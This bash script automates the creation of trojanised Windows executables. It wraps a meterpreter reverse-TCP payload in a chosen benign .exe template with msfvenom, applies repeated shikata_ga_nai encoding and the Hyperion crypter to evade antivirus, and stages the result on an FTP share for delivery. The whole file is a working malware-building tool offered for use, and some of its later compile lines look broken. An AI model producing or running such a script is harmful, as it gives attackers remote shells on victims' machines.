#MSFVenom Powershell x64 
#$varTemplate provide a MS Exe eg Calc.exe 
#Use meter.sh to create the reverse meterpreter shell 
#adds Hyperion to exe to encrypt payload, addtional bypass


echo "Enter the number of iterations of encoding"
read varEncode
echo " "
l=(ls)

i=ifconfig

g=$($i | grep "inet " | grep -v "127" | sed 's/inet//g' | sed 's/  netmask 255.255.255.0  broadcast *.*.*.*//g')
echo "This is the current IP...." $g
echo "Enter the IP"
read varIP
echo " "
echo "Enter the Local Port eg 443"
read varLPort
echo " "
echo "This is a list of the current .exe's"
echo " "
$l ../Source/*.exe

echo " "

echo "Enter the name of one of the .exe's listed, aka Template"
read varTemplate

echo " "
echo "Current list of malware"
$l ./Output
echo " "

echo "Name of Output file inc exetension"
read varOutFile

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai  -i $varEncode LHOST=$varIP LPORT=$varLPort -f exe -x ../Source/$varTemplate -k > OutPut/$varOutFile 

i686-w64-mingw32-c++ /usr/share/windows-binaries/hyperion/Src/Crypter/*.cpp -o /root/Desktop/AV/Hyperion/OutPut/hyperion.exe

i686-w64-minw32-gcc OutPut/$varOutFile 



cp Output/$varOutFile /srv/ftp





